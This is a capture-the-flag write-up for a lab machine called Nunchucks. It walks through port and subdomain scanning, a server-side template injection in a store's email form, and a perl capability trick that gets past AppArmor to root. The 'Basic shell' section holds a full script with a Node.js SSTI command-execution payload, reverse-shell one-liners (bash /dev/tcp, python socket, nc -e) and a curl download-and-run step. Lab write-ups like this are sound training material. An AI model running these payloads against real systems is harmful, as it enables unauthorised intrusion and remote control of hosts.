# Nunchucks

## Remote Discovery
> Note: the box IP has been added to the `/etc/hosts` file as `nunchucks.htb`

### Nmap Scan
An `nmap -Sc -Sv nunchucks.htb` yields:
```
...
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
...
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)\
...
```

So we've got a website. Lets take a look and also use some gobuster to make our lives easier.

### Gobuster Scan
For a dir scan, we'll have to get creative, as an invalid page still gives a 200 status. Luckily the response seems to be the same length every time if
it is incorrect. So we'll run this:
```bash
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -k --exclude-length 45 -u https://nunchucks.htb > gb_common.txt

$ cat gb_common.txt
...
/assets               (Status: 301) [Size: 179] [--> /assets/]
/Login                (Status: 200) [Size: 9172]
/login                (Status: 200) [Size: 9172]
/privacy              (Status: 200) [Size: 19134]
/Privacy              (Status: 200) [Size: 19134]
/signup               (Status: 200) [Size: 9488]
/terms                (Status: 200) [Size: 17753]
```

### Entry Point Search

We can look all over the place for an exploit... but I don't think we'll find one. Even doing some `sqlmap` goodness on the login and signup pages yield nothing... which leads us to more discovery.


### Gobuster Part 2
Now we'll search for subdomains using `ffuf` (Fuzz Faster U Fool):
```bash
$ ffuf -k -u https://nunchucks.htb -H "Host: FUZZ.nunchucks.htb" -w /usr/share/wordlists/dirb/small.txt -fl 547 > ffuf_small.txt

$ cat ffuf_small.txt
store                   [Status: 200, Size: 4029, Words: 1053, Lines: 102]
```

Ah! So there is a store to this as well at `https://store.nunchucks.htb`. Now we're getting somewhere.


### Foothold

On the store site, there is a form that submits an email address to `/api/submit`, where (after some poking around) we find that it is vulnerable to an `SSTI` attack (server-side template injection). Now we can hopefully use some template injections to get a basic shell on the machine.

## Basic shell
To simplify the ease of attacking the machine, I've created this simple script to get a basic shell as `david`:
```bash
$ cat shell.sh

#!/bin/bash

# Define some variables
if [[ -z $1 ]]; then
        PORT=5001
else
        PORT=$1
fi
IP=$(ifconfig tun0 | grep 'inet ' | cut -d: -f2 | awk '{print $2}')
TMPFILE=$( mktemp --tmpdir=. )
TMPFILE=$( echo ${TMPFILE:2} )
cat << EOF> $TMPFILE
bash -i >& /dev/tcp/$IP/$PORT 0>&1 && exit 1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$IP'",'$PORT'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' && exit 1
nc -e /bin/sh $IP $PORT && exit 1
xterm -display $IP:$PORT && exit 1
EOF
C1="curl http://$IP/$TMPFILE > /tmp/shell.sh"
C2="/bin/bash /tmp/shell.sh &"

# Define functions
function send_command {
        COMMAND=$1
        if [[ -z $COMMAND ]]; then
                COMMAND="pwd"
        fi
        #echo "Sending command $COMMAND..." ## Debugging...
        RESPONSE=$(curl -s -k -H "Content-Type: application/json" https://store.nunchucks.htb/api/submit -d '{"email":"{{range.constructor(\"return global.process.mainModule.require('"'child_process'"').execSync('"'$COMMAND'"')\")()}}"}')
        R1=$(echo ${RESPONSE:70})
        LEN=$( expr length "$R1" )
        if [[ $LEN -gt 5 ]]; then
                echo -e $( echo ${R1::-5} )
        fi
}

function cleanup {
        echo "Removing shell files"
        rm $TMPFILE
        send_command "rm /tmp/shell.sh"
}
trap cleanup EXIT # run the cleanup command on script exit

# Run the reverse shell stuff

## Start http server
python3 -m http.server 80 &
pid=$!
sleep 1

## Get the reverse script
send_command "$C1"
sleep 1

## Stop the http server
kill "${pid}"

## Start a nc listener and run the connection
{ sleep 2; res=$( send_command "$C2" ); } &
nc -lvnp $PORT
```

## Privilege Escalation

To get our root shell, we will use `pearl` as we have the `cap_setuid+ep` enabled. We also note that when we attempt this, we are denied a root shell:
```bash
$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
$
```

We are being denied this by `apparmor`. Fortunately, there is an explot wherein if we start a script with a shebang (`#!`) then we can skip the checks for some reason...
```bash
$ cat /tmp/pe.pl

#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/sh"

$ /tmp/pe.pl
#
```

And thus, we have a root shell!
